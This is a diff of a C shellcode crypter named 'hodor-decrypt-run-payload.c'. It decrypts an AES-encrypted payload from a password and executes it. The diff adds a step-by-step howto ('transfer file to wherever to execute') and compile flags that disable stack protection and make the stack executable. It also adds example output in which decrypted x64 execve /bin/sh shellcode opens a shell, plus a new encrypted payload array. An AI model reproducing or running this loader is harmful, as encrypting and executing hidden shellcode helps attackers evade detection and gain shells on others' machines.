@@ -1,9 +1,59 @@
 /*
-Filename: hodor-decrypt-run.c
+Filename: hodor-decrypt-run-payload.c
 Author: hodorsec
-Description: Decrypts a file as input with a given password, outputs in C hex and run the code
-Compile with: gcc -fno-stack-protector -z execstack -fno-pie -o hodor-decrypt-run hodor-decrypt-run.c  -lcrypto -I /usr/include/openssl -L /usr/lib/
+Description: Decrypts a file as input with a given password, outputs in C hex and run the code. AES-128-CBC is being used for encryption with a hardcoded IV.
+Requires the "libssl-dev" library
+
+Howto:
+ - Put encrypted payload in array "enc_in[]", as being encrypted by "hodor-encrypt-payload" and given password
+ - Compile
+ - Transfer file to wherever to execute
+ - Run binary and enter previously used password
+ - Magic
+
+For x86:
+Compile with: gcc -fno-stack-protector -z execstack -fno-pie -o hodor-decrypt-run-payload hodor-decrypt-run-payload.c -lcrypto -I /usr/include/openssl -L /usr/lib/
+
+For x64:
+Compile with: gcc -fno-stack-protector -z execstack -fno-pie -o hodor-decrypt-run-payload hodor-decrypt-run-payload.c -lcrypto -I /usr/include/openssl -fPIC -L /usr/lib/
+
+Run as:
+$ ./hodor-decrypt-run-payload
+Next: 
+Enter password to decrypt and run payload, used "123456" for example
+
+------EXAMPLE------
+
+$ ./hodor-decrypt-run-payload
+Enter password to decrypt:
+
+ENCRYPTED:
+Oneliner:
+"\x04\x97\x23\x87\x10\x34\x47\xE4\xF1\xD9\xAE\x31\x94\xEA\x6C\x5D\xFE\x46\x67\x3D\x14\xC1\x94\x27\x4B\x9C\xC0\x62\xFC\x2B\xFA\xCA";
+
+16-byte newline delimiter:
+"\x04\x97\x23\x87\x10\x34\x47\xE4\xF1\xD9\xAE\x31\x94\xEA\x6C\x5D"\
+"\xFE\x46\x67\x3D\x14\xC1\x94\x27\x4B\x9C\xC0\x62\xFC\x2B\xFA\xCA";
+
+DECRYPTED:
+Oneliner:
+"\x50\x48\x31\xD2\x48\x31\xF6\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\xB0\x3B\x0F\x05\x31\x02";
+
+16-byte newline delimiter:
+"\x50\x48\x31\xD2\x48\x31\xF6\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73"\
+"\x68\x53\x54\x5F\xB0\x3B\x0F\x05\x31\x02";
+
+Running shellcode...
+$ whoami
+vbox
+$ id
+uid=1000(vbox) gid=1000(vbox) groups=1000(vbox),27(sudo),143(vboxsf)
+$
+
+------EXAMPLE------
+
 */
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -16,16 +66,11 @@ void print_data(const char *title, const void* data, int len);
 /* Do the actual work */
 int main(int argc, char **argv)
 {
-	/* Input */
+	/* Input - execve encrypted payload x64 */
 	const char enc_in[] = \
-	"\x58\x8C\xE6\xF3\x0D\x12\x5A\x42\xFD\x86\xA2\x9B\x81\xC6\x6F\xAD"\
-	"\xA1\x6A\xC5\xA1\xF9\xB8\xEE\xA1\xCD\xB4\xB2\x82\x72\x4C\x15\xC3"\
-	"\x91\x38\x99\x6A\x4F\xAA\x05\x1D\x29\x76\x63\x51\x64\xB3\x9B\xBD"\
-	"\xF9\x63\x6B\xA3\x5F\x7A\xF9\x64\x0E\xE0\x20\x92\xA0\xD5\x53\x4B"\
-	"\x45\x8A\x29\xF6\x5B\xBA\x1C\x24\x1D\xF2\x72\x06\x4A\x4F\x33\x85"\
-	"\x0D\xE1\x42\x16\x22\xE4\x4B\x25\x2F\x6F\x3A\x8A\x5D\x57\xD5\x35"\
-	"\xB3\x01\x21\x10\x15\xAB\x13\xC0\xB3\xFE\xC8\xB3\x55\x4C\xEF\x83";
-	
+	"\xC4\xA9\x6C\xA6\x3A\x1A\xAB\xF9\x15\x76\x9D\xF8\x65\x6A\x7D\x42"\
+	"\x32\x65\x9E\xA8\x5E\x3F\xC5\x97\xB6\x58\x87\xA1\xE1\xB4\xD4\x9E";
+
 	int lenShell = sizeof(enc_in) - 1;		// Minus NULL-byte
 	
 	// Variables
@@ -95,4 +140,5 @@ void print_data(const char *title, const void* data, int len)
 	}
 	printf("\";\n");
 }
+
 
